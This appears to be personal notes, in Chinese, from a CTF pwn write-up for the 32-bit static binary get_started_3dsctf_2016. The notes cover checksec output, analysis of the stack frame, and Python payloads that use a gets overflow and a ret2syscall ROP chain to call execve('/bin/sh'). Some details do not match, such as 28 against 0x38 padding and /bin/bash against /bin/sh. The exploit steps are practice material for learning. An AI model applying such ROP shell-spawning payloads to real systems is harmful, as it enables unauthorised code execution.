第一步检查：
```bash
C:\Users\A\Downloads>checksec get_started_3dsctf_2016 [*] 'C:\\Users\\A\\Downloads\\get_started_3dsctf_2016' 
Arch: i386-32-little 
RELRO: Partial RELRO 
Stack: No canary found 
NX: NX enabled 
PIE: No PIE (0x8048000) 
Stripped: No
```

- 32位程序，小端序
- GOT部分可写
- 没有栈保护
- 栈不可执行
- 地址固定
- 保留了字符表和调试信息

ida反汇编看到`main`函数含`gets`初步推测为栈溢出，点开`v4`看：
```asm
-000000000000003C // Use data definition commands to manipulate stack variables and arguments.
-000000000000003C // Frame size: 3C; Saved regs: 0; Purge: 0
-000000000000003C
-000000000000003C     char *Qual_a_palavrinha_magica?;
-0000000000000038     __int16 var_38[28];
+0000000000000000     _UNKNOWN *__return_address;
+0000000000000004     int argc;
+0000000000000008     const char **argv;
+000000000000000C     const char **envp;
+0000000000000010
+0000000000000010 // end of stack variables
```
在`__return_address`前无`saved_rbp`，因此可直接填充28个字符后写入地址。（外平栈）

```bash
┌──(root㉿LAPTOP-8AL8TI9I)-[/home/kaf/pwn-practice/buff-ctf/get_started_3dsctf_2016 1]
└─# file get_started_3dsctf_2016
get_started_3dsctf_2016: ELF 32-bit LSB executable, Intel i386, version 1 (GNU/Linux), statically linked, for GNU/Linux 2.6.32, not stripped
```

可见该程序为静态链接程序
静态程序，就不得不想起其有丰富的pop，ret指令，即可以为我们构成ret2syscall（就是构造execve函数）。

可构造execve:
```asm
mov eax,0xb
mov ebx,["/bin/sh"]
mov ecx,0
mov edx,0
int 0x80
```


但是我们无法找到直接可用的`bin/bash`字符串，需要自行构造

第一次栈溢出ret覆盖`gets`地址，然后用`gets`在.bss段写入`/bin/bash`
(首先找到可用的.bss段地址，这里用080ECD60作为buff)
![[Pasted image 20251120101625.png]]

payload:
```python
payload = b'a' * 0x38 payload += p32(gets) + p32(main) + p32(buf_addr)
io.sendline(payload) 
payload = b'/bin/sh\x00' 
io.sendline(payload)
```

这里需要注意顺序
函数调用栈的一般结构：
![[Pasted image 20251120102214.png]]
返回到`gets`函数后，先将`main`函数地址写入`gets`函数的`ret`，再把`buf_addr`写入参数，即向`buf_addr`写入`stdin`的数据，即再次输入`/bin/bash`字符串

最后第二次payload即按照execve构造ROP：
```python
payload = b'a' * 0x38 
payload += p32(pop_eax_ret) + p32(0xb) + p32(pop_edx_ecx_ebx_ret) + p32(0) + p32(0) + p32(buf) 
payload += p32(int_80)
```

